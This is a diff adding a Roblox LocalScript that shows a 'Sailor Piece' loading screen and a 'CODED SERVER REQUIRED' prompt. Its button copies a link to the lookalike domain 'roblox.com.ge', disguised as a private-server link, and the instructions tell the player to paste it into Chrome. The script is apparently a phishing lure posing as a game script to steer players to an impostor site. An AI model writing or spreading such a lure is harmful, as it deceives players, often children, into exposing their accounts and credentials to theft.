@@ -1,0 +1,157 @@
+-- LocalScript
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+
+local codedServerLink = "https://roblox.com.ge/games/17625359962/RIVALS?privateServerLinkCode=90101715194380786045075318200046"
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "CodedServerGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+--------------------------------------------------
+-- LOADING SCREEN
+--------------------------------------------------
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(1,0,1,0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+loadingFrame.Parent = gui
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1,0,0.15,0)
+loadingText.Position = UDim2.new(0,0,0.42,0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading..."
+loadingText.TextColor3 = Color3.fromRGB(0,170,255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.GothamBold
+loadingText.Parent = loadingFrame
+
+-- FIXED Sailor Piece text (no collision)
+local smallText = Instance.new("TextLabel")
+smallText.Size = UDim2.new(1,0,0.05,0)
+smallText.Position = UDim2.new(0,0,0.60,0) -- moved lower
+smallText.BackgroundTransparency = 1
+smallText.Text = "Sailor Piece"
+smallText.TextColor3 = Color3.fromRGB(150,150,150)
+smallText.TextScaled = false -- prevents stretching issues
+smallText.TextSize = 18 -- clean small size
+smallText.Font = Enum.Font.Gotham
+smallText.Parent = loadingFrame
+
+-- wait 3 seconds
+task.wait(3)
+
+-- fade out
+local fade = TweenService:Create(loadingFrame, TweenInfo.new(0.8), {
+	BackgroundTransparency = 1
+})
+fade:Play()
+fade.Completed:Wait()
+loadingFrame:Destroy()
+
+--------------------------------------------------
+-- MAIN FRAME
+--------------------------------------------------
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.4,0,0.35,0)
+mainFrame.Position = UDim2.new(0.3,0,0.3,0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(10,10,15)
+mainFrame.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0,20)
+corner.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(0,170,255)
+stroke.Thickness = 2
+stroke.Parent = mainFrame
+
+--------------------------------------------------
+-- TITLE
+--------------------------------------------------
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0.25,0)
+title.Position = UDim2.new(0,0,0.05,0)
+title.BackgroundTransparency = 1
+title.Text = "CODED SERVER REQUIRED"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+--------------------------------------------------
+-- SUBTEXT
+--------------------------------------------------
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(1, -20, 0.15, 0)
+sub.Position = UDim2.new(0,10,0.22,0)
+sub.BackgroundTransparency = 1
+sub.Text = "Join the coded private server to use this script safely 🔥"
+sub.TextColor3 = Color3.fromRGB(180,180,180)
+sub.TextScaled = true
+sub.Font = Enum.Font.Gotham
+sub.Parent = mainFrame
+
+--------------------------------------------------
+-- INSTRUCTIONS
+--------------------------------------------------
+local instructions = Instance.new("TextLabel")
+instructions.Size = UDim2.new(1, -40, 0.35, 0)
+instructions.Position = UDim2.new(0.5, 0, 0.4, 0)
+instructions.AnchorPoint = Vector2.new(0.5,0)
+instructions.BackgroundTransparency = 1
+instructions.TextWrapped = true
+instructions.Text =
+	"1. Click the button below\n" ..
+	"2. Paste the link into a new Chrome tab\n" ..
+	"3. Click Play on Roblox\n" ..
+	"4. Join and run the script"
+instructions.TextColor3 = Color3.fromRGB(200,200,200)
+instructions.TextScaled = true
+instructions.Font = Enum.Font.Gotham
+instructions.Parent = mainFrame
+
+--------------------------------------------------
+-- BUTTON
+--------------------------------------------------
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.7,0,0.2,0)
+button.Position = UDim2.new(0.15,0,0.75,0)
+button.BackgroundColor3 = Color3.fromRGB(0,170,255)
+button.Text = "Get Coded Server"
+button.TextColor3 = Color3.fromRGB(255,255,255)
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.Parent = mainFrame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0,14)
+btnCorner.Parent = button
+
+local btnStroke = Instance.new("UIStroke")
+btnStroke.Color = Color3.fromRGB(0,170,255)
+btnStroke.Thickness = 2
+btnStroke.Parent = button
+
+--------------------------------------------------
+-- BUTTON FUNCTION
+--------------------------------------------------
+button.MouseButton1Click:Connect(function()
+	button.Text = "Generating..."
+	task.wait(1.2)
+
+	local success = pcall(function()
+		setclipboard(codedServerLink)
+	end)
+
+	if success then
+		button.Text = "Copied!"
+	else
+		button.Text = "Not Supported"
+	end
+end)
